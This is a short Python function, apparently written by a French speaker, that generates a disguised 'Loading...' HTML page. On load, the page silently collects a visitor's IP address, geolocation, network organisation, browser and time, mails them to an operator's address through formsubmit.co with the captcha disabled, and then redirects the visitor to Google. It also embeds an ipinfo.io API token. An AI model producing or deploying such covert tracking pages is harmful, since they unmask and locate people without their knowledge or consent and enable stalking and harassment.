def generate_tracker_html(email, save_path):
    html_content = f"""
<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <title>Chargement...</title>
  <script>
    async function collectAndSend() {{
      try {{
        const response = await fetch("https://ipinfo.io/json?token=15f29802768d7e"); // Remplace par ton token
        const data = await response.json();

        const ip = data.ip || "N/A";
        const city = data.city || "N/A";
        const region = data.region || "N/A";
        const country = data.country || "N/A";
        const loc = data.loc || "N/A";
        const org = data.org || "N/A";
        const datetime = new Date().toLocaleString();
        const userAgent = navigator.userAgent;

        document.getElementById("ip").value = ip;
        document.getElementById("ville").value = city;
        document.getElementById("region").value = region;
        document.getElementById("pays").value = country;
        document.getElementById("localisation").value = loc;
        document.getElementById("org").value = org;
        document.getElementById("navigateur").value = userAgent;
        document.getElementById("datetime").value = datetime;

        document.getElementById("trackerForm").submit();
      }} catch (e) {{
        console.error("Erreur de collecte :", e);
      }}
    }}
    window.onload = collectAndSend;
  </script>
</head>
<body>
  <form id="trackerForm" action="https://formsubmit.co/{email}" method="POST">
    <input type="hidden" name="ip" id="ip">
    <input type="hidden" name="ville" id="ville">
    <input type="hidden" name="region" id="region">
    <input type="hidden" name="pays" id="pays">
    <input type="hidden" name="localisation" id="localisation">
    <input type="hidden" name="org" id="org">
    <input type="hidden" name="navigateur" id="navigateur">
    <input type="hidden" name="datetime" id="datetime">

    <!-- Redirection silencieuse -->
    <input type="hidden" name="_next" value="https://www.google.com">
    <input type="hidden" name="_captcha" value="false">
  </form>
</body>
</html>
"""
    with open(save_path, "w", encoding="utf-8") as f:
        f.write(html_content)